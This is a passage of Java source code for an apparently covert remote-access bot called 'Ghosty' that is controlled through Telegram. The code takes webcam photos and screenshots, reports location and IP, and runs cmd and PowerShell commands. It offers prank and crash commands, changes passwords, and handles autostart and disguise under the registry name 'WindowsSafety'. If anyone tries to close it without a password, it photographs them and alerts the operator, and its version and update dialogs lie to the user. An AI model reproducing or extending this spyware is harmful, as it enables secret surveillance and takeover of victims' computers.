                Reg.deleteValue(Reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "WindowsSafety");
            } catch (Exception e) {
            }
            System.exit(0);
        } catch (Exception e) {
            sendNachrichtAdmin("Fehler bei der Tarnung!");
        }

    }

    void takepic() {
        try {
            Webcam webcam = Webcam.getDefault();
            File pic = new File("FaceDetection.png");
            Dimension[] nonStandardResolutions = new Dimension[]{
                    WebcamResolution.PAL.getSize(),
                    WebcamResolution.HD720.getSize(),
                    new Dimension(2000, 1000),
                    new Dimension(1000, 500),
            };
            webcam.setCustomViewSizes(nonStandardResolutions);
            webcam.setViewSize(WebcamResolution.HD720.getSize());
            webcam.open();
            ImageIO.write(webcam.getImage(), "png", pic);
            webcam.close();
            sendPic(pic);
            pic.delete();
        } catch (IOException e) {
            sendNachricht(e.toString());
        }
    }

    void sendLocation(float lat, float lon) {
        SendLocation tes = new SendLocation();
        tes.setLatitude(lat);
        tes.setLongitude(lon);
        tes.setChatId(admin);
        try {
            sendLocation(tes);
        } catch (Exception e) {
            sendNachrichtAdmin(e.toString());
        }
    }

    public void sendPic(File send) {
        SendPhoto tes = new SendPhoto();
        tes.setNewPhoto(send);
        tes.setChatId(admin);
        try {
            sendPhoto(tes);
        } catch (Exception e) {
            sendNachrichtAdmin(e.toString());
        }
    }

    public String getItems() {
        switch (menu) {
            default:
            case -1:
                if (troll)
                    return "Fun,Info,Tools,Music";
                else
                    return "Info,Tools,Music";
            case 0:
                return "DVD open,DVD close,website,Dog cleaner,Strange,Walk,Caps Fucker,Windows Fucker,Screen Fucker,Mouse Fucker,All Fucker,nobrain,bluescreen,scare";
            case 1:
                return "Screenshot,Uptime,Wer,BatteryInformation,Location,Version,Path,Name,Pic,OperatingSystem,IP";
            case 2:
                return "Shutdown,Restart,Black,Lock,Alarm,Autolock,Sleep,Close,Retry,ChangePW,Powershell,Uninstall,BotReset,Tarn,Cmd,Autostart";
            case 3:
                return "Down,Un-/Mute,Up,Previous,Play/Pause,Next";
            case 100:
                return "Yes, No";
        }
    }

    void tray() {
        if (!alive)
            return;
        if (!SystemTray.isSupported()) {
            return;
        }
        SystemTray systemTray = SystemTray.getSystemTray();
        //get the systemTray of the system
        //get default toolkit
        //Toolkit toolkit = Toolkit.getDefaultToolkit();
        //get image
        //Toolkit.getDefaultToolkit().getImage("src/resources/busylogo.jpg");
        Image image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/3.gif"));
        ;

        //popupmenu
        PopupMenu trayPopupMenu = new PopupMenu();

        MenuItem feedback = new MenuItem("Feedback");
        feedback.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JPanel panel = new JPanel();
                JLabel label = new JLabel("Please enter your feedback:");
                JTextArea pass = new JTextArea(5, 40);
                pass.requestFocus();
                pass.setLineWrap(true);
                pass.setWrapStyleWord(true);
                panel.add(label);
                panel.add(pass);
                panel.grabFocus();
                String[] options = new String[]{"Send", "Cancel"};
                int option = JOptionPane.showOptionDialog(null, panel, "Feedback",
                        JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
                        null, options, pass);
                if (option == 0) // pressing OK button
                {
                    String send = pass.getText();
                    if (send.equals(""))
                        return;
                    try {
                        TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
                        sup = telegramBotsApi.registerBot(new SupBot("Feedback:" + "\n" + send));
                        sup.close();
                    } catch (TelegramApiRequestException e1) {
                        sendNachrichtAdmin("Fehler bei Feedback.");
                    }

                    JOptionPane.showMessageDialog(null, "Thank you for your Feedback!\nOur Team will take a look at it as soon as possible.");
                }
            }
        });
        trayPopupMenu.add(feedback);
        //1t menuitem for popupmenu
        MenuItem action = new MenuItem("Version");
        action.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showMessageDialog(null, "Version: " + version + "\nNewest Version!");
            }
        });
        trayPopupMenu.add(action);
        MenuItem update = new MenuItem("Update");
        update.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JOptionPane.showMessageDialog(null, "No Update available!");
            }
        });
        trayPopupMenu.add(update);
        //2nd menuitem of popupmenu
        MenuItem close = new MenuItem("Close");
        close.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                JPanel panel = new JPanel();
                JLabel label = new JLabel("Please enter your password:");
                JPasswordField pass = new JPasswordField(10);
                panel.add(label);
                panel.add(pass);
                panel.grabFocus();
                String[] options = new String[]{"OK", "Cancel"};
                int option = JOptionPane.showOptionDialog(null, panel, "Password",
                        JOptionPane.NO_OPTION, JOptionPane.PLAIN_MESSAGE,
                        null, options, options[0]);
                String pw = "";
                if (option == 0) // pressing OK button
                {
                    char[] password = pass.getPassword();
                    pw = new String(password);
                }
                if (pw.equals(Bot.getPassword())) {
                    try {
                        Runtime.getRuntime().exec("cmd /c taskkill /F /IM powershell.exe");
                    } catch (IOException ex) {
                        sendNachrichtAdmin("Fehler beim beenden");
                    }
                    System.exit(0);
                } else {
                    sendNachricht("Warning!\nSomeone tried to kill Ghosty!");
                    takepic();
                }
            }
        });
        trayPopupMenu.add(close);

        //setting tray icon
        trayIcon = new TrayIcon(image, "Ghosty", trayPopupMenu);
        //adjust to default size as per system recommendation
        trayIcon.setImageAutoSize(true);


        try {
            systemTray.add(trayIcon);
        } catch (AWTException awtException) {
            awtException.printStackTrace();
        }
    }

    public void setImage(int status) {
        if (!alive)
            return;
        Image image;
        switch (status) {
            default:
            case 0:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/3.gif"));
                break;
            case 1:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/update.gif"));
                break;
            case 2:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/received.gif"));
                break;
            case 3:
                image = Toolkit.getDefaultToolkit().getImage(Bot.class.getResource("/Bilder/err.gif"));
                break;
        }
        trayIcon.setImage(image);
    }

    public void setSilent(boolean silen) {
        silent = silen;
        File botconf = new File(System.getProperty("user.home") + "\\botconf.bot");
        botconf.delete();
        config.setSilent(silen);
        writeConf();
    }

    private void writeConf() {
        try {
            removeConf();
            Thread.sleep(500);
            FileOutputStream fos = new FileOutputStream(System.getProperty("user.home") + "\\botconf.bot");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(config);
            oos.close();
            Thread.sleep(500);
        } catch (Exception e) {
            sendNachrichtAdmin("Fehler beim writen\n" + this.getBotUsername() + "\n" + e);
        }
    }

    private KeyboardRow getRow(int Seite, int Spalte, int gesamt, String[] buttonArray) {
        KeyboardRow row = new KeyboardRow();
        KeyboardRow one = new KeyboardRow();
        one.add("Leave");
        KeyboardRow firstmenu = new KeyboardRow();
        firstmenu.add("Leave");
        firstmenu.add("Forward");
        KeyboardRow lastmenu = new KeyboardRow();
        lastmenu.add("Back");
        lastmenu.add("Leave");
        KeyboardRow menu = new KeyboardRow();
        menu.add("Back");
        menu.add("Leave");
        menu.add("Forward");
        if (Spalte >= 0 && Spalte <= 1) {
            for (int i = 0; i < 3; i++) {
                try {
                    row.add(buttonArray[Seite * 6 + Spalte * 3 + i]);
                } catch (Exception e) {
                    break;
                }
            }
            return row;
        }
        if (gesamt == 1)
            return one;
        if (Seite == 0)
            return firstmenu;
        if (Seite == gesamt - 1)
            return lastmenu;

        return menu;
    }

    public static String getPassword() {
        return password;
    }

    public static void setPassword(String password) {
        Bot.password = password;
    }

    public static boolean isSilent() {
        return silent;
    }

    public static boolean isAlive() {
        return alive;
    }
}
